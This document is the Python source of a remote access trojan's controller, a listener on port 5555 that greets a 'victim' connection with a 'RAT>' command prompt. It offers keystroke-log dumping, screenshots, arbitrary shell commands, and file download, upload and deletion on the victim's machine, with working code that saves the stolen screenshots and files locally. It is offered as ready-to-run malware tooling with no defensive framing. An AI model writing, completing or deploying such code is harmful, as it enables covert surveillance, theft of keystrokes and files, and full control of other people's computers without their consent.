# controller.py - run on your machine
# python controller.py

import socket, struct, sys, os, base64, time

HOST = "0.0.0.0"
PORT = 5555

def send(sock, data: bytes):
    sock.sendall(struct.pack(">I", len(data)) + data)

def recv(sock):
    hdr = sock.recv(4)
    if not hdr: return None
    n = struct.unpack(">I", hdr)[0]
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk: return None
        buf += chunk
    return buf

def main():
    print(f"[*] listening on {PORT} ...")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen(1)
    conn, addr = s.accept()
    print(f"[+] victim connected: {addr}")

    banner = recv(conn)
    print(f"[+] {banner.decode()}")

    while True:
        try:
            cmd = input("RAT> ").strip()
        except (EOFError, KeyboardInterrupt):
            break
        if not cmd: continue
        if cmd.lower() in ("exit", "quit"): break

        if cmd.lower() == "help":
            print("""
commands:
  ping              - check alive
  sysinfo           - computer / user
  keylog            - dump keystrokes
  keylog_clear      - wipe keylog
  screenshot        - grab screen → saves as screen.png
  shell <cmd>       - run any command
  cd <path>         - change dir
  pwd               - current dir
  ls                - list files
  download <path>   - pull file from victim
  upload <local> <remote> - push file to victim
  rm <path>         - delete file
  any other text    - treated as shell command
""")
            continue

        # special handling for screenshot
        if cmd.lower() == "screenshot":
            send(conn, b"screenshot")
            data = recv(conn)
            if data and data != b"fail":
                with open("screen.png", "wb") as f:
                    f.write(data)
                print(f"[+] screenshot saved → screen.png ({len(data)} bytes)")
            else:
                print("[-] failed")
            continue

        # upload helper
        if cmd.lower().startswith("upload "):
            parts = cmd.split(" ", 2)
            if len(parts) < 3:
                print("usage: upload <localfile> <remotepath>")
                continue
            local, remote = parts[1], parts[2]
            try:
                raw = open(local, "rb").read()
                b64 = base64.b64encode(raw).decode()
                send(conn, f"upload {remote} {b64}".encode())
                print(recv(conn).decode())
            except Exception as e:
                print(e)
            continue

        # download helper
        if cmd.lower().startswith("download "):
            path = cmd[9:].strip()
            send(conn, f"download {path}".encode())
            data = recv(conn)
            if data:
                name = os.path.basename(path) or "downloaded.bin"
                with open(name, "wb") as f:
                    f.write(data)
                print(f"[+] saved → {name} ({len(data)} bytes)")
            continue

        # normal command
        send(conn, cmd.encode())
        resp = recv(conn)
        if resp is None:
            print("[-] connection lost")
            break
        try:
            print(resp.decode("utf-8", "ignore"))
        except:
            print(resp)

    conn.close()
    s.close()

if __name__ == "__main__":
    main()